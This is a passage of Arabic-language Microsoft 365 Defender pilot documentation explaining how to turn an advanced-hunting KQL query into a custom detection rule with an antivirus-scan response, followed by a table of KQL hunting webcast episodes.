    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>إنشاء كشف

بعد إنشاء استعلام يحدد المعلومات التي تريد تنبيهك بشأنها في حال حدوثها في  المستقبل، يمكنك إنشاء كشف مخصص من الاستعلام.

سيتم تشغيل الاستعلام حسب التكرار الذي قمت بتعيينه في عمليات الكشف المخصصة، وستنشئ نتائج الاستعلامات تنبيهات أمان، استنادا إلى الأصول التي تختارها. سيتم ربط هذه التنبيهات بالحوادث ويمكن فرزها لأي تنبيه أمان آخر يتم إنشاؤه بواسطة أحد المنتجات.

1. في صفحة الاستعلام، قم بإزالة الأسطر 7 و8 التي تم إضافتها في الخطوة 7 من إرشادات "الانتقال للصيد" وانقر فوق **إنشاء قاعدة الكشف**.

   ![لقطة شاشة للصفحة التي يمكنك فيها النقر فوق إنشاء قاعدة الكشف في صفحة الصيد المتقدمة](../../media/mtp/fig22.png)

   > [!NOTE]
   > إذا نقرت فوق **إنشاء قاعدة الكشف** وكان لديك أخطاء في بناء الجملة في الاستعلام، فلن يتم حفظ قاعدة الكشف. تحقق مرة أخرى من الاستعلام للتأكد من عدم وجود أي أخطاء.

2. قم بتعبئة الحقول المطلوبة بالمعلومات التي ستسمح لفريق الأمان بفهم التنبيه، ولماذا تم إنشاؤه، والإجراءات التي تتوقع منهم اتخاذها.

   ![لقطة شاشة لصفحة قاعدة إنشاء الكشف حيث يمكنك تحديد تفاصيل التنبيه](../../media/mtp/fig23.png)

   تأكد من ملء الحقول بوضوح للمساعدة في منح المستخدم التالي قرارا مخبرا حول تنبيه قاعدة الكشف هذا

3. حدد الكيانات التي تم التأثير عليها في هذا التنبيه. في هذه الحالة، حدد **الجهاز** علبة **البريد**.

   ![لقطة شاشة لصفحة قاعدة إنشاء الكشف حيث يمكنك اختيار معلمات الكيانات التي تم التأثير عليها](../../media/mtp/fig24.png)

4. حدد الإجراءات التي يجب اتخاذها إذا تم تشغيل التنبيه. في هذه الحالة، قم بتشغيل فحص الحماية من الفيروسات، على الرغم من أنه يمكن اتخاذ إجراءات أخرى.

   ![لقطة شاشة لصفحة إنشاء قاعدة الكشف حيث يمكنك تشغيل فحص الحماية من الفيروسات عند تشغيل تنبيه للمساعدة في معالجة التهديدات](../../media/mtp/fig25.png)

5. حدد نطاق قاعدة التنبيه. بما أن هذا الاستعلام يتضمن أجهزة، فإن مجموعات الأجهزة ذات صلة في عملية الكشف المخصصة هذه وفقا لسياق Microsoft Defender لنقطة النهاية. عند إنشاء الكشف المخصص الذي لا يتضمن الأجهزة ككيانات متأثّر بها، لا يتم تطبيق النطاق.

   ![لقطة شاشة لصفحة إنشاء قاعدة الكشف حيث يمكنك تعيين نطاق قاعدة التنبيه لإدارة توقعاتك للنتائج التي ستشاهدها](../../media/mtp/fig26.png)

   بالنسبة إلى هذا النموذج التجريبي، قد ترغب في حصر هذه القاعدة في مجموعة فرعية من أجهزة الاختبار في بيئة الإنتاج.

6. حدد **إنشاء**. بعد ذلك، **حدد قواعد الكشف المخصصة** من لوحة التنقل.

   ![لقطة شاشة لخيار قواعد الكشف المخصصة في القائمة](../../media/mtp/fig27a.png)

   ![لقطة شاشة لصفحة قواعد الكشف التي تعرض تفاصيل القاعدة والتنفيذ](../../media/mtp/fig27b.png)

   من هذه الصفحة، يمكنك تحديد قاعدة الكشف، التي ستفتح صفحة تفاصيل.

   ![لقطة شاشة لصفحة مرفقات البريد الإلكتروني حيث يمكنك رؤية حالة تنفيذ القاعدة والتنبيهات والإجراءات التي تم تشغيلها وتحرير الكشف وما إلى ذلك](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>تمارين إضافية متقدمة للصيد

للتعرف على المزيد حول الصيد المتقدم، ستعرض لك البثات التالية على الويب قدرات الصيد المتقدم داخل Microsoft 365 Defender لإنشاء استعلامات أعمدة تتقاطع مع الأعمدة، وتركيزها على الكيانات وإنشاء إجراءات الكشف واسترداد الأعمدة المخصصة.

> [!NOTE]
> كن مستعدا باستخدام حساب GitHub الخاص بك لتشغيل استعلامات الصيد في بيئة اختبار الاختبار التجريبي.

|العنوان|الوصف|تنزيل MP4|مشاهدة على YouTube|ملف CSL لاستخدامه|
|---|---|---|---|---|
|الحلقة 1: أساسيات KQL|سنغطي أساسيات قدرات الصيد المتقدمة في Microsoft 365 Defender. تعرف على بيانات الصيد المتقدمة المتوفرة و بناء جملة KQL الأساسي و عوامل التشغيل.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[الحلقة 1: ملف CSL في Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|الحلقة 2: انضمامات|سنستمر في التعرف على البيانات في الصيد المتقدم وكيفية جمع الجداول معا. تعرف على الضم الداخلي والخارجي والتفردي وشبه الخارجي، وعلى الفروق الدقيقة لضم Kusto innerunique الافتراضي.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[الحلقة 2: ملف CSL في Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|الحلقة 3: تلخيص البيانات وتبويلها وإبجابها|الآن وقد أصبحنا قادرين على تصفية البيانات والتعامل معها وضمها، حان الوقت لبدء تلخيص البيانات، وتصنيفها، وتكبيرها، وتصويرها. في هذه الحلقة، سنغطي عامل تشغيل التلخيص وبعض العمليات الحسابية التي يمكنك تنفيذها أثناء الغطس في جداول إضافية في مخطط الصيد المتقدم. نحن نحول مجموعات البيانات إلى مخططات يمكن أن تساعد على تحسين التحليل.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[الحلقة 3: ملف CSL في Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|الحلقة 4: لنصيد! تطبيق KQL على تعقب الأحداث|حان الوقت لتعقب بعض أنشطة المهاجمين! في هذه الحلقة، سنستخدم فهمنا المحسن ل KQL والصيد المتقدم في Microsoft 365 Defender لتعقب هجوم. تعرف على بعض التلميحات والنصائح المستخدمة في الحقل لتعقب نشاط المهاجمين، بما في ذلك ABCs الخاصة بالأمان الإلكتروني وكيفية تطبيقها على الاستجابة للحوادث.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[الحلقة 4: ملف CSL في Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>الخطوة التالية

|![مرحلة التلخيص والختام](../../media/mtp/close.png) <br>[مرحلة التلخيص والختام](m365d-pilot-close.md)|قم بتحليل Microsoft 365 Defender التجريبي، وأعرضها على المساهمين، واتخذ الخطوة التالية.
|:-----|:-----|
